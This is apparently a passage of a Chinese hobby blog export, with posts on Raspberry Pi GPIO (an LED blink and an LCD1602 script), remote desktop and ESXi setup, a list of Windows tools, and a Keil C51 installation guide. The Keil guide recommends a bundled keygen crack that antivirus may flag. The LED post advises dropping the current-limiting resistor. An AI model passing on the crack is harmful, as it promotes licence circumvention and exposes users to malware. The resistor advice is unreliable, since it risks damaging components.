<p><strong>第二个编号系统是BCM号码。这是一种较低级别的工作方式 - 它指的是Broadcom SOC上的通道号码。您必须始终使用那个通道编号所对应的树莓派板上哪个引脚的图表。您的脚本程序可能会在Raspberry Pi板的硬件修订后而不能使用。</strong></p>
<p><strong>我们在使用RPi.GPIO包的时候必须要指定正在使用的（必需）：</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">GPIO.setmode(GPIO.BOARD)</span><br><span class="line">  <span class="comment"># or</span></span><br><span class="line">GPIO.setmode(GPIO.BCM)</span><br></pre></td></tr></table></figure>

<p><strong>模式将是GPIO.BOARD则返回10，如果是GPIO.BCM则返回11，如果没有设置则返回None</strong></p>
<p><strong>下面附上GPIO图，适用BCM编码</strong></p>
<p><img src="/2023/03/16/raspberry-400/GPIO-Pinout-Diagram-2.png" alt="GPIO-Pinout-Diagram-2"></p>
<p><img src="/2023/03/16/raspberry-400/image-20230412230626919.png" alt="image-20230412230626919"></p>
<p><strong><a href="https://pinout.xyz/">交互式引脚排列图：</a>这个网站可以查看GPIO接口作用</strong></p>
<h3 id="警告"><a href="#警告" class="headerlink" title="警告"></a>警告</h3><p><strong>你可能在Raspberry Pi的GPIO上有多个脚本&#x2F;电路。因此，如果RPi.GPIO检测到引脚已被配置为默认（输入）以外的其他引脚，则在尝试配置脚本时会收到警告。要禁用这些警告：</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">GPIO.setwarnings(<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>

<h3 id="设置一个通道"><a href="#设置一个通道" class="headerlink" title="设置一个通道"></a>设置一个通道</h3><p><strong>你需要设置您用作输入或输出的每个通道。下面是将通道配置为输入：</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">GPIO.setup(channel, GPIO.IN)     <span class="comment">#channel是作者定义的通道名，它最终会调用一个数字，即通道编号</span></span><br></pre></td></tr></table></figure>

<p><strong>（其中通道是基于你指定的编号系统（BOARD或BCM）的通道编号）。</strong></p>
<p><strong>有关设置输入通道的更多高级信息，请参阅<a href="https://sourceforge.net/p/raspberry-gpio-python/wiki/Inputs/">此处</a>。</strong></p>
<p><strong>要将通道设置为输出：</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">GPIO.setup(channel, GPIO.OUT)</span><br></pre></td></tr></table></figure>

<p><strong>（其中通道是基于您指定的编号系统（BOARD或BCM）的通道编号）。</strong></p>
<p><strong>你还可以为您的输出通道指定一个初始值：</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">GPIO.setup(channel, GPIO.OUT, initial=GPIO.HIGH)</span><br></pre></td></tr></table></figure>

<h3 id="设置多个通道"><a href="#设置多个通道" class="headerlink" title="设置多个通道"></a>设置多个通道</h3><p><strong>你可以一次设置多个通道（从版本 0.5.8 及更高版本）。例如：</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">chan_list  =  [ <span class="number">11</span> ，<span class="number">12</span> ]     ＃添加任意数量的通道！</span><br><span class="line">                              ＃你可以用元组代替，即：</span><br><span class="line">                              ＃chan_list =（<span class="number">11</span>,<span class="number">12</span>）</span><br><span class="line">GPIO.setup(chan_list, GPIO.OUT)</span><br></pre></td></tr></table></figure>

<h3 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h3><p><strong>读取GPIO引脚的值：</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">GPIO.<span class="built_in">input</span>(channel)</span><br></pre></td></tr></table></figure>

<p><strong>（其中通道是基于你指定的编号系统（BOARD 或 BCM）的通道编号）。这将返回<code>0 / GPIO.LOW / False</code>或<code>1 / GPIO.HIGH / True</code></strong></p>
<p><strong>有几种方法可以将GPIO输入到您的程序中。第一种也是最简单的方法是在某个时间点检查输入值。这就是所谓的“轮询”，如果你的程序在错误的时间读取了值，可能会错过输入。轮询在循环中执行，并可能是处理器密集型的。响应GPIO输入的另一种方式是使用’中断’（边沿检测）。边沿是从高电平到低电平（下降沿）或从低电平到高电平（上升沿）的意思。</strong></p>
<h2 id="点亮LED灯珠"><a href="#点亮LED灯珠" class="headerlink" title="点亮LED灯珠"></a>点亮LED灯珠</h2><p><strong>实验材料：1.官方说的耐压2.2v的小灯珠（我经过5V测试两颗，果然烧了，然后使用树莓派3.3VGPIO口）、2.色环电阻一颗（27K）3.杜邦线公口若干条、4.GPIO口拓展线一根、5.T型GPIO拓展板一块、6.面包板一块</strong></p>
<p><strong>我们使用树莓派GPIO17接面包板的GND，然后树莓派GPIO第1口（3.3V）接面包板VCC，LED和电阻一起接上面包板GND和VCC（注意：LED有正负极，长的是+，短的是-；电阻不分正负），接上去之后可以看到LED灯是亮的，因为GPIO1口是默认3.3V电压，所以灯已经亮起。</strong></p>
<p><img src="/2023/03/16/raspberry-400/image-20230412230418872.png" alt="image-20230412230418872"></p>
<p><img src="/2023/03/16/raspberry-400/IMG_20230412_184612.jpg" alt="IMG_20230412_184612"></p>
<p><strong>那么，由于前面烧了两颗LED，我可以得知，我的LED是能扛得住3.3V电压直接上电的，所以有了下面这个图（电阻去掉，用杜邦线直接连接）</strong></p>
<p><img src="/2023/03/16/raspberry-400/IMG_20230412_184544.jpg" alt="IMG_20230412_184544"></p>
<p> <strong>一直亮着也不是个好玩的是吧，那我写个python让它闪烁咯</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> RPi.GPIO <span class="keyword">as</span> GPIO</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">LED = <span class="number">17</span></span><br><span class="line">GPIO.setmode(GPIO.BCM)</span><br><span class="line">GPIO.setup(LED,GPIO.OUT)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        GPIO.output(LED,GPIO.HIGH)</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">        GPIO.output(LED,GPIO.LOW)</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;except&quot;</span>)</span><br><span class="line">        GPIO.cleanup()</span><br></pre></td></tr></table></figure>

<p><img src="/2023/03/16/raspberry-400/IMG_20230412_184628.jpg" alt="IMG_20230412_184628"></p>
<p><strong>可以看出，python控制的HIGHT电平比默认的更加亮，而且能够闪烁（这里由于是图片，所以看不到闪烁）</strong></p>
<h2 id="显示信息在LCD-1602"><a href="#显示信息在LCD-1602" class="headerlink" title="显示信息在LCD_1602"></a>显示信息在LCD_1602</h2><p><strong>实验材料：1.LCD1602显示面板、2.可调电阻（也叫可变电阻）3.杜邦线公口若干条、4.GPIO口拓展线一根、5.T型GPIO拓展板一块、6.面包板一块</strong></p>
<p><strong>我们要根据BCM编码来接线</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@raspberrypi:/share/raspberry<span class="comment"># gpio readall</span></span><br><span class="line"> +-----+-----+---------+------+---+---Pi 3B+-+---+------+---------+-----+-----+</span><br><span class="line"> | BCM | wPi |   Name  | Mode | V | Physical | V | Mode | Name    | wPi | BCM |</span><br><span class="line"> +-----+-----+---------+------+---+----++----+---+------+---------+-----+-----+</span><br><span class="line"> |     |     |    3.3v |      |   |  1 || 2  |   |      | 5v      |     |     |</span><br><span class="line"> |   2 |   8 |   SDA.1 |   IN | 1 |  3 || 4  |   |      | 5v      |     |     |</span><br><span class="line"> |   3 |   9 |   SCL.1 |   IN | 1 |  5 || 6  |   |      | 0v      |     |     |</span><br><span class="line"> |   4 |   7 | GPIO. 7 |  OUT | 0 |  7 || 8  | 0 | IN   | TxD     | 15  | 14  |</span><br><span class="line"> |     |     |      0v |      |   |  9 || 10 | 1 | IN   | RxD     | 16  | 15  |</span><br><span class="line"> |  17 |   0 | GPIO. 0 |   IN | 0 | 11 || 12 | 0 | IN   | GPIO. 1 | 1   | 18  |</span><br><span class="line"> |  27 |   2 | GPIO. 2 |   IN | 0 | 13 || 14 |   |      | 0v      |     |     |</span><br><span class="line"> |  22 |   3 | GPIO. 3 |   IN | 0 | 15 || 16 | 0 | IN   | GPIO. 4 | 4   | 23  |</span><br><span class="line"> |     |     |    3.3v |      |   | 17 || 18 | 0 | IN   | GPIO. 5 | 5   | 24  |</span><br><span class="line"> |  10 |  12 |    MOSI |   IN | 0 | 19 || 20 |   |      | 0v      |     |     |</span><br><span class="line"> |   9 |  13 |    MISO |   IN | 0 | 21 || 22 | 0 | IN   | GPIO. 6 | 6   | 25  |</span><br><span class="line"> |  11 |  14 |    SCLK |   IN | 0 | 23 || 24 | 1 | IN   | CE0     | 10  | 8   |</span><br><span class="line"> |     |     |      0v |      |   | 25 || 26 | 1 | IN   | CE1     | 11  | 7   |</span><br><span class="line"> |   0 |  30 |   SDA.0 |   IN | 1 | 27 || 28 | 1 | IN   | SCL.0   | 31  | 1   |</span><br><span class="line"> |   5 |  21 | GPIO.21 |   IN | 1 | 29 || 30 |   |      | 0v      |     |     |</span><br><span class="line"> |   6 |  22 | GPIO.22 |   IN | 1 | 31 || 32 | 0 | IN   | GPIO.26 | 26  | 12  |</span><br><span class="line"> |  13 |  23 | GPIO.23 |   IN | 0 | 33 || 34 |   |      | 0v      |     |     |</span><br><span class="line"> |  19 |  24 | GPIO.24 |   IN | 0 | 35 || 36 | 0 | IN   | GPIO.27 | 27  | 16  |</span><br><span class="line"> |  26 |  25 | GPIO.25 |   IN | 0 | 37 || 38 | 0 | IN   | GPIO.28 | 28  | 20  |</span><br><span class="line"> |     |     |      0v |      |   | 39 || 40 | 0 | IN   | GPIO.29 | 29  | 21  |</span><br><span class="line"> +-----+-----+---------+------+---+----++----+---+------+---------+-----+-----+</span><br><span class="line"> | BCM | wPi |   Name  | Mode | V | Physical | V | Mode | Name    | wPi | BCM |</span><br><span class="line"> +-----+-----+---------+------+---+---Pi 3B+-+---+------+---------+-----+-----+</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>这个图不够直观的话，可以看看下面这个图：</strong></p>
<p><img src="/2023/03/16/raspberry-400/rpi-pins-40-0.png" alt="rpi-pins-40-0"></p>
<p><strong>根据python代码接好线路</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">LCD_RS = <span class="number">7</span></span><br><span class="line">LCD_E = <span class="number">8</span></span><br><span class="line">LCD_D4 = <span class="number">25</span></span><br><span class="line">LCD_D5 = <span class="number">24</span></span><br><span class="line">LCD_D6 = <span class="number">23</span></span><br><span class="line">LCD_D7 = <span class="number">18</span></span><br></pre></td></tr></table></figure>

<ul>
<li><strong>LCE1602的VSS和K接口要接地，</strong></li>
<li><strong>VDD和A要接上正极（+），</strong></li>
<li><strong>V0是调节液晶显示的偏压信号，可接10K的可调电阻，V0接可调电阻中间脚位，可调电阻另外两个脚位一个接地一个接正极，</strong></li>
<li><strong>RS接树莓派BCM7号位，</strong></li>
<li><strong>RW接地（接地表示是写入模式），</strong></li>
<li><strong>E使能接树莓派BCM8号位，</strong></li>
<li><strong>D4接树莓派BCM25号位，</strong></li>
<li><strong>D5接树莓派BCM24号位，</strong></li>
<li><strong>D6接树莓派BCM23号位，</strong></li>
<li><strong>D7接树莓派BCM18号位</strong></li>
</ul>
<p><strong>下面是接完线之后的样子：</strong></p>
<p><img src="/2023/03/16/raspberry-400/IMG_20230418_154545.jpg" alt="IMG_20230418_154545"><img src="/2023/03/16/raspberry-400/IMG_20230418_154550.jpg" alt="IMG_20230418_154550"></p>
<p><strong>给树莓派执行下面python脚本</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> RPi.GPIO <span class="keyword">as</span> GPIO</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">LCD_RS = <span class="number">7</span></span><br><span class="line">LCD_E = <span class="number">8</span></span><br><span class="line">LCD_D4 = <span class="number">25</span></span><br><span class="line">LCD_D5 = <span class="number">24</span></span><br><span class="line">LCD_D6 = <span class="number">23</span></span><br><span class="line">LCD_D7 = <span class="number">18</span></span><br><span class="line">LCD_CHR = <span class="literal">True</span></span><br><span class="line">LCD_CMD = <span class="literal">False</span></span><br><span class="line">LCD_LINE_1 = <span class="number">0x80</span></span><br><span class="line">LCD_LINE_2 = <span class="number">0xc0</span></span><br><span class="line">E_PULSE = <span class="number">0.0005</span></span><br><span class="line">E_DELAY = <span class="number">0.0005</span></span><br><span class="line"></span><br><span class="line">like = <span class="string">&#x27;I love raspberry&#x27;</span></span><br><span class="line">lu = <span class="string">&#x27;       orange&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lcd_toggle_enable</span>():</span><br><span class="line">    time.sleep(E_DELAY)</span><br><span class="line">    GPIO.output(LCD_E,<span class="literal">True</span>)</span><br><span class="line">    time.sleep(E_PULSE)</span><br><span class="line">    GPIO.output(LCD_E,<span class="literal">False</span>)</span><br><span class="line">    time.sleep(E_DELAY)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lcd_byte</span>(<span class="params">bits,mode</span>):</span><br><span class="line">    GPIO.output(LCD_RS,mode)</span><br><span class="line">    GPIO.output(LCD_D4,<span class="literal">False</span>)</span><br><span class="line">    GPIO.output(LCD_D5,<span class="literal">False</span>)</span><br><span class="line">    GPIO.output(LCD_D6,<span class="literal">False</span>)</span><br><span class="line">    GPIO.output(LCD_D7,<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> bits &amp; <span class="number">0x10</span> == <span class="number">0x10</span>:</span><br><span class="line">        GPIO.output(LCD_D4,<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">if</span> bits &amp; <span class="number">0x20</span> == <span class="number">0x20</span>:</span><br><span class="line">        GPIO.output(LCD_D5,<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">if</span> bits &amp; <span class="number">0x40</span> == <span class="number">0x40</span>:</span><br><span class="line">        GPIO.output(LCD_D6,<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">if</span> bits &amp; <span class="number">0x80</span> == <span class="number">0x80</span>:</span><br><span class="line">        GPIO.output(LCD_D7,<span class="literal">True</span>)</span><br><span class="line">    lcd_toggle_enable()</span><br><span class="line"></span><br><span class="line">    GPIO.output(LCD_D4,<span class="literal">False</span>)</span><br><span class="line">    GPIO.output(LCD_D5,<span class="literal">False</span>)</span><br><span class="line">    GPIO.output(LCD_D6,<span class="literal">False</span>)</span><br><span class="line">    GPIO.output(LCD_D7,<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> bits &amp; <span class="number">0x01</span> == <span class="number">0x01</span>:</span><br><span class="line">        GPIO.output(LCD_D4,<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">if</span> bits &amp; <span class="number">0x02</span> == <span class="number">0x02</span>:</span><br><span class="line">        GPIO.output(LCD_D5,<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">if</span> bits &amp; <span class="number">0x04</span> == <span class="number">0x04</span>:</span><br><span class="line">        GPIO.output(LCD_D6,<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">if</span> bits &amp; <span class="number">0x08</span> == <span class="number">0x08</span>:</span><br><span class="line">        GPIO.output(LCD_D7,<span class="literal">True</span>)</span><br><span class="line">    lcd_toggle_enable()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lcd_init</span>():</span><br><span class="line">    lcd_byte(<span class="number">0x33</span>,LCD_CMD)</span><br><span class="line">    lcd_byte(<span class="number">0x32</span>,LCD_CMD)</span><br><span class="line">    lcd_byte(<span class="number">0x01</span>,LCD_CMD)</span><br><span class="line">    lcd_byte(<span class="number">0x0f</span>,LCD_CMD)</span><br><span class="line">    lcd_byte(<span class="number">0x06</span>,LCD_CMD)</span><br><span class="line">    lcd_byte(LCD_LINE_1,LCD_CMD)</span><br><span class="line">    time.sleep(E_DELAY)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    GPIO.setwarnings(<span class="literal">False</span>)</span><br><span class="line">    GPIO.setmode(GPIO.BCM)</span><br><span class="line">    GPIO.setup(LCD_E,GPIO.OUT)</span><br><span class="line">    GPIO.setup(LCD_RS,GPIO.OUT)</span><br><span class="line">    GPIO.setup(LCD_D4,GPIO.OUT)</span><br><span class="line">    GPIO.setup(LCD_D5,GPIO.OUT)</span><br><span class="line">    GPIO.setup(LCD_D6,GPIO.OUT)</span><br><span class="line">    GPIO.setup(LCD_D7,GPIO.OUT)</span><br><span class="line">    lcd_init()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(like)):</span><br><span class="line">        lcd_byte(<span class="built_in">ord</span>(like[i]),LCD_CHR)</span><br><span class="line">        time.sleep(<span class="number">0.05</span>)</span><br><span class="line">    lcd_byte(LCD_LINE_2,LCD_CMD)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(lu)):</span><br><span class="line">        lcd_byte(<span class="built_in">ord</span>(lu[i]),LCD_CHR)</span><br><span class="line">        time.sleep(<span class="number">0.05</span>)</span><br><span class="line">        </span><br><span class="line">main()</span><br></pre></td></tr></table></figure>

<p><strong>看看效果吧</strong></p>
<p><img src="/2023/03/16/raspberry-400/IMG_20230418_143304.jpg" alt="IMG_20230418_143304"></p>
<p><strong>开头的显示没有问题，但是第二行出现了乱码。</strong></p>
<p><img src="/2023/03/16/raspberry-400/IMG_20230418_142443.jpg" alt="IMG_20230418_142443"></p>
]]></content>
      <categories>
        <category>娱乐单片机</category>
      </categories>
      <tags>
        <tag>树莓派</tag>
        <tag>单片机</tag>
      </tags>
  </entry>
  <entry>
    <title>raspberry(搁浅)</title>
    <url>/2022/07/17/raspberry/</url>
    <content><![CDATA[<p>[toc]</p>
<h1 id="raspberry-搁浅"><a href="#raspberry-搁浅" class="headerlink" title="raspberry(搁浅)"></a>raspberry(搁浅)</h1><h2 id="基础入门"><a href="#基础入门" class="headerlink" title="基础入门"></a>基础入门</h2><h3 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h3><h3 id="2-远程连接"><a href="#2-远程连接" class="headerlink" title="2.远程连接"></a>2.远程连接</h3><h4 id="window端远程连接"><a href="#window端远程连接" class="headerlink" title="window端远程连接"></a>window端远程连接</h4><p>要使用window的远程连接<code>mstsc</code>的话需要树莓派安装了<code>xrdp</code>这个软件；当然如果你觉得自带的不香的话也可以用树莓派自带的<code>vnc</code>，这得需要你去官网下一个<code>vncviewer</code>  这个客户端</p>
<p><strong>raspberry设置</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install xrdp</span><br></pre></td></tr></table></figure>

<h4 id="linux端远程连接"><a href="#linux端远程连接" class="headerlink" title="linux端远程连接"></a>linux端远程连接</h4><p>将树莓派打开<code>vnc</code>功能，然后就可以通过vnc远程连接了</p>
<p><strong>raspberry设置</strong></p>
<p>因为我使用的系统是manjaro那么我就推荐arch的软件咯</p>
<p><strong>manjaro设置</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yay -S realvnc-vnc-viewer</span><br></pre></td></tr></table></figure>



<h2 id="虚拟篇"><a href="#虚拟篇" class="headerlink" title="虚拟篇"></a>虚拟篇</h2><h3 id="exsi虚拟化"><a href="#exsi虚拟化" class="headerlink" title="exsi虚拟化"></a>exsi虚拟化</h3><h4 id="一-树莓派更新"><a href="#一-树莓派更新" class="headerlink" title="一.树莓派更新"></a>一.树莓派更新</h4><h4 id="二-前期步骤"><a href="#二-前期步骤" class="headerlink" title="二.前期步骤"></a>二.前期步骤</h4><ul>
<li><p><a href="https://flings.vmware.com/esxi-arm-edition">exsi官方下载地址</a></p>
</li>
<li><p><a href="https://bit.ly/2HpIaG6">最新的 Raspberry Pi 固件</a></p>
</li>
<li><p><a href="https://bit.ly/3jota8D">UEFI 树莓派固件</a></p>
</li>
</ul>
<p>下载到以上的文件之后，先解压<code>firmware-master.zip</code>这个文件，弹出文件是否替换，单击<code>全部选否</code>，解压完成之后进入<code>boot</code>文件目录，拷贝里面的全部内容到你格式化好的tf卡中，并且删除掉这几个<code>kernel*</code>的文件。</p>
<p><img src="/2022/07/17/raspberry/image-20220719185945121-1658231139940.png" alt="image-20220719185945121"></p>
<p><img src="/2022/07/17/raspberry/image-20220719191049021-1658231139941.png" alt="image-20220719191049021"></p>
<p><img src="/2022/07/17/raspberry/image-20220719191232782-1658231139941.png" alt="image-20220719191232782"></p>
<p>接下来解压<code>RPi4_UEFI_Firmware_v1.20</code>压缩包，把里面的所有的内容拷贝到tf卡里面，弹出是否要替换文件的时候选择<code>替换目标中的文件</code></p>
<p><img src="/2022/07/17/raspberry/image-20220719192054052-1658231139941.png" alt="image-20220719192054052"></p>
<p>在<code>config.txt</code>文件中添加<code>gpu_mem=16</code></p>
<p><img src="/2022/07/17/raspberry/image-20220719192730271-1658231139941.png" alt="image-20220719192730271"></p>
<h4 id="三-exsi-install"><a href="#三-exsi-install" class="headerlink" title="三.exsi install"></a>三.exsi install</h4>]]></content>
      <categories>
        <category>娱乐单片机</category>
      </categories>
      <tags>
        <tag>树莓派</tag>
        <tag>单片机</tag>
      </tags>
  </entry>
  <entry>
    <title>window端有趣的软件</title>
    <url>/2023/01/08/window%E7%AB%AF%E6%9C%89%E8%B6%A3%E7%9A%84%E8%BD%AF%E4%BB%B6/</url>
    <content><![CDATA[<p><a href="https://www.bluetoothgoodies.com/a2dp/files/AlternativeA2dpSetup-0.8.3.1.msi">Alternative A2DP Driver</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">改蓝牙编码和码率</span><br></pre></td></tr></table></figure>

<p><a href="https://github.com/lyswhut/lx-music-desktop">落雪音乐</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">免费听音乐</span><br></pre></td></tr></table></figure>

<p><a href="https://github.com/jadepeng/XMusicDownloader">XMusic</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">大规模下载音乐</span><br></pre></td></tr></table></figure>

<p><a href="https://www.getmusicbee.com/">MusicBee</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">很强大的音乐播放器(要自己找无损音乐)</span><br></pre></td></tr></table></figure>

<p><a href="https://www.balena.io/etcher/">balenaEtcher</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">一款SD卡刷写器应用程序</span><br></pre></td></tr></table></figure>

<p><a href="https://rufus.ie/zh/">rufus</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">创建USB启动盘的软件</span><br></pre></td></tr></table></figure>

<p><a href="https://github.com/2dust/v2rayN">v2rayn</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">fq 软件</span><br></pre></td></tr></table></figure>

<p><a href="https://github.com/Dreamacro/clash/releases">clash</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">clash猫 fq 软件</span><br></pre></td></tr></table></figure>

<p><a href="https://dbeaver.io/download/">DBeaver Community</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">数据库的一款连接软件(有免费和收费双版本)</span><br></pre></td></tr></table></figure>

<p><a href="https://hmcl.huangyuhui.net/">HMCL</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">HMCL MC客户端</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>软件</tag>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title>单片机开发和学习</title>
    <url>/2022/07/28/%E5%8D%95%E7%89%87%E6%9C%BA%E5%BC%80%E5%8F%91%E5%92%8C%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>[toc]</p>
<h2 id="单片机吹水"><a href="#单片机吹水" class="headerlink" title="单片机吹水"></a>单片机吹水</h2><p><strong>1.学习哪种单片机</strong></p>
<p><strong>51、AVR、MSP430、STM8、STM32、DSP、linux、FPGA</strong></p>
<p><strong>2.学习单片机的最佳办法</strong></p>
<ul>
<li><strong>鹦鹉学舌</strong></li>
<li><strong>照葫芦画瓢</strong></li>
<li><strong>他山之石，可以攻玉</strong></li>
<li><strong>理论和实践相结合，温故而知新</strong></li>
</ul>
<p><strong>3.学习单片机的准备工作</strong></p>
<ul>
<li><strong>要有信心、恒心和耐心</strong></li>
<li><strong>完善的配套流程</strong></li>
<li><strong>计算机一台</strong></li>
<li><strong>51开发板一块</strong></li>
</ul>
<h2 id="芯片学习"><a href="#芯片学习" class="headerlink" title="芯片学习"></a>芯片学习</h2><p><strong>51单片机是对所有兼容Intel8031指令系统的单片机的统称，这一系列的单片机的始祖是Intel的8031单片机，后来随着flash ROM技术的发展，8031单片机取得了长足的进展成为了应用最广泛的8bit单片机之一，他的代表型号就是ATMEL公司的AT89系列。</strong></p>
<h2 id="安装单片机开发环境"><a href="#安装单片机开发环境" class="headerlink" title="安装单片机开发环境"></a>安装单片机开发环境</h2><h3 id="安装keil"><a href="#安装keil" class="headerlink" title="安装keil"></a>安装keil</h3><h4 id="KEIL-C51-软件获取"><a href="#KEIL-C51-软件获取" class="headerlink" title="KEIL C51 软件获取"></a>KEIL C51 软件获取</h4><p>要在电脑上成功安装 KEIL C51，首先必须要有安装包，我们可以通过万能的百度，搜索关键字“KEIL C51 下载”，上面会有很多下载渠道，也可以在KEIL的官网上下载： <a href="https://www.keil.com/download/product/%EF%BC%8C%E6%89%93%E5%BC%80%E7%95%8C%E9%9D%A2%E5%A6%82%E4%B8%8B%E5%9B%BE%E6%89%80%E7%A4%BA%E3%80%82">https://www.keil.com/download/product/，打开界面如下图所示。</a></p>
<p><img src="/2022/07/28/%E5%8D%95%E7%89%87%E6%9C%BA%E5%BC%80%E5%8F%91%E5%92%8C%E5%AD%A6%E4%B9%A0/image-20220728220612959.png" alt="image-20220728220612959"></p>
<p>不过我们资料内已经给大家提供了下载好的软件，在资料“<strong>\5–开发工具\1-KEILC51 软件</strong>”内，直接使用即可，省去了查找下载的时间。我们使用KEIL C51 是 9.01 版本， 如果后面出了更高的版本选择性升级即可，不过也没有必要使用最新的，用习惯了一个软件就行。 使用我们提供下载好的软件包，其内部含有如下图所示文件。</p>
<p><img src="/2022/07/28/%E5%8D%95%E7%89%87%E6%9C%BA%E5%BC%80%E5%8F%91%E5%92%8C%E5%AD%A6%E4%B9%A0/image-20220728220739858.png" alt="image-20220728220739858"></p>
<p><strong>C51V901.exe：是 KEIL C51 软件的安装文件。</strong> </p>
<p><strong>keygen_new2032.zip：KEIL C51 破解软件</strong>，在 KEIL C51 不破解的情况下只能编译 2K 大小文件，如果工程超过 2K，编译即会报错，因此需要破解。有的电脑系统会误认为该文件是病毒文件，所以这里把它压缩存放。</p>
<h4 id="KEIL-C51-软件安装"><a href="#KEIL-C51-软件安装" class="headerlink" title="KEIL C51 软件安装"></a>KEIL C51 软件安装</h4><p>软件包下载完成之后，我们双击 C51V901.exe 这个应用程序，弹出如下所示对话框。</p>
<p><img src="/2022/07/28/%E5%8D%95%E7%89%87%E6%9C%BA%E5%BC%80%E5%8F%91%E5%92%8C%E5%AD%A6%E4%B9%A0/image-20220728223545240.png" alt="image-20220728223545240"></p>
<p>点击 Next 按钮。 弹出如下对话框。</p>
<p><img src="/2022/07/28/%E5%8D%95%E7%89%87%E6%9C%BA%E5%BC%80%E5%8F%91%E5%92%8C%E5%AD%A6%E4%B9%A0/image-20220728223846155.png" alt="image-20220728223846155"></p>
<p>在红框 2 中勾选上，点击 Next 按钮。弹出如下对话框。</p>
<p><img src="/2022/07/28/%E5%8D%95%E7%89%87%E6%9C%BA%E5%BC%80%E5%8F%91%E5%92%8C%E5%AD%A6%E4%B9%A0/image-20220728224107252.png" alt="image-20220728224107252"></p>
<p>点击红框 4 选择软件安装的路径，我们这里在 磁盘盘内新建一个文件夹，命名为 KEILC51，将其安装到该文件夹内，方便软件的管理。**特别要注意： **</p>
<p>**（1）软件安装保存路径不能出现中文或者特殊字符，否则会出现很多奇怪的错误，到时候很难找问题。 **</p>
<p><strong>（2）不要将 KEIL5 软件和 KEIL4 或者 51 的 KEIL 安装在一个文件夹内。</strong>然后点击 Next。弹出如下对话框。</p>
<p><img src="/2022/07/28/%E5%8D%95%E7%89%87%E6%9C%BA%E5%BC%80%E5%8F%91%E5%92%8C%E5%AD%A6%E4%B9%A0/image-20220728225157414.png" alt="image-20220728225157414"></p>
<p>在红色框 6 和 7 中我们随便输入一些东西， 我们这里输入数字11，当然也可以输入空格， 但是一定要输入， 否则红色框 8 就一直是灰色状态，输入完成后点击 Next， 弹出如下对话框。</p>
<p><img src="/2022/07/28/%E5%8D%95%E7%89%87%E6%9C%BA%E5%BC%80%E5%8F%91%E5%92%8C%E5%AD%A6%E4%B9%A0/image-20220728225336184.png" alt="image-20220728225336184"></p>
<p>说明 KEIL C51 软件正在安装，只要等一段时间即可，安装完成以后会出现如下界面。</p>
<p><img src="/2022/07/28/%E5%8D%95%E7%89%87%E6%9C%BA%E5%BC%80%E5%8F%91%E5%92%8C%E5%AD%A6%E4%B9%A0/image-20220728225539980.png" alt="image-20220728225539980"></p>
<p>点击 Finish 按钮完成 KEIL C51 软件的安装过程。KEIL C51 安装完成后在电脑桌面上一般会有一个快捷方式，如下所示：</p>
<p><img src="/2022/07/28/%E5%8D%95%E7%89%87%E6%9C%BA%E5%BC%80%E5%8F%91%E5%92%8C%E5%AD%A6%E4%B9%A0/image-20220728225655136.png" alt="image-20220728225655136"></p>
